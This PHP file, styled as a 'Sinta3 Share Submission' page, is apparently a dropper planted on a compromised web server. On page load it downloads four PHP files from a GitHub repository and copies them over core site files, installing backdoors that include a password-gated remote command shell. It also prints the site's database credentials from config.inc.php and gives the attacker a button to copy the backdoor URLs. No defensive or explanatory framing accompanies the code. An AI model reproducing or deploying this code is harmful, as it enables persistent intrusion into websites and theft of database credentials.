<?php
system("wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/Mail.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/Core.inc.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/dbscripts.php;wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/autoMaintenance.php;cp Mail.php ../../../classes/mail/Mail.php;cp Core.inc.php ../../../classes/core/Core.inc.php;cp autoMaintenance.php ../../../tools/autoMaintenance.php;cp dbscripts.php ../../../dbscripts/index.php;");

$domainName = $_SERVER['SERVER_NAME'];

$domainUrl = "http://" . $domainName;
$mailUrl = "http://" . $domainName . "/classes/mail/Mail.php";
$requestUrl = "http://" . $domainName . "/classes/core/Core.inc.php?pss=123@ayamjago&cmm=ls";
$autoMaintenanceUrl = "http://" . $domainName . "/tools/autoMaintenance.php";
$dbscriptsUrl = "http://" . $domainName . "/dbscripts";

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sinta3 Share Submission</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: black;
        }

        p,
        a {
            color: white;
            text-decoration: none;
        }

        button {
            background-color: #007bff;
            border: none;
            color: white;
            padding: 15px 32px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
            border-radius: 8px;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }

        .copied-label {
            background-color: #74E291;
            color: black;
            padding: 10px;
            border-radius: 8px;
            position: absolute;
            top: 70px;
            left: 50%;
            transform: translateX(-50%);
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .copied-label.show {
            opacity: 1;
        }

        @keyframes fadeInOut {
            0% {
                opacity: 0;
            }

            10% {
                opacity: 1;
            }

            90% {
                opacity: 1;
            }

            100% {
                opacity: 0;
            }
        }

        .copied-label.animation {
            animation: fadeInOut 3s ease;
        }

        .button-container {
            text-align: center;
        }
    </style>
</head>

<body>
    <div class="button-container">
        <button onclick="copyToClipboard()"><strong>Copy Submission URLs</strong></button>
    </div>

    <div class="copied-label" id="copiedLabel">Copied!</div>
    <p><a href="<?php echo $mailUrl; ?>" target="_blank"><?php echo $mailUrl; ?></a></p>
    <p><a href="<?php echo $requestUrl; ?>" target="_blank"><?php echo $requestUrl; ?></a></p>
    <p><a href="<?php echo $autoMaintenanceUrl; ?>" target="_blank"><?php echo $autoMaintenanceUrl; ?></a></p>
    <p><a href="<?php echo $dbscriptsUrl; ?>" target="_blank"><?php echo $dbscriptsUrl; ?></a></p>

    <p><?php
        system("grep -A 7 '\[database\]' ../../../config.inc.php | tail -n 7");
        ?></p>

    <div class="copied-label" id="copiedLabel">Copied!</div>

    <script>
        var dmailUrl = "http://" + window.location.hostname + "/classes/mail/Mail.php",
            drequestUrl = "http://" + window.location.hostname + "/classes/core/Core.inc.php?pss=123@ayamjago&cmm=ls",
            dautoMaintenanceUrl = "http://" + window.location.hostname + "/tools/autoMaintenance.php",
            ddbscriptsUrl = "http://" + window.location.hostname + "/dbscripts";

        document.getElementById("mailUrlDisplay").textContent = dmailUrl;
        document.getElementById("requestUrlDisplay").textContent = drequestUrl;
        document.getElementById("autoMaintenanceUrlDisplay").textContent = dautoMaintenanceUrl;
        document.getElementById("dbscriptUrlDisplay").textContent = ddbscriptsUrl;

        function copyToClipboard() {
            var mailUrl = "<?php echo $mailUrl; ?>";
            var requestUrl = "<?php echo $requestUrl; ?>";
            var autoMaintenanceUrl = "<?php echo $autoMaintenanceUrl; ?>";
            var dbscriptsUrl = "<?php echo $dbscriptsUrl; ?>";
            var domainUrl = "<?php echo $domainUrl; ?>";

            var urlsToCopy = domainUrl + "\n" + mailUrl + "\n" + requestUrl + "\n" + autoMaintenanceUrl + "\n" + dbscriptsUrl + "\n\n";

            var textarea = document.createElement("textarea");
            textarea.value = urlsToCopy;
            document.body.appendChild(textarea);

            textarea.select();
            document.execCommand("copy");

            document.body.removeChild(textarea);

            var copiedLabel = document.getElementById("copiedLabel");
            copiedLabel.classList.add("show");
            copiedLabel.classList.add("animation");

            setTimeout(function() {
                copiedLabel.classList.remove("show");
                copiedLabel.classList.remove("animation");
            }, 3000);
        }
    </script>
</body>

</html>
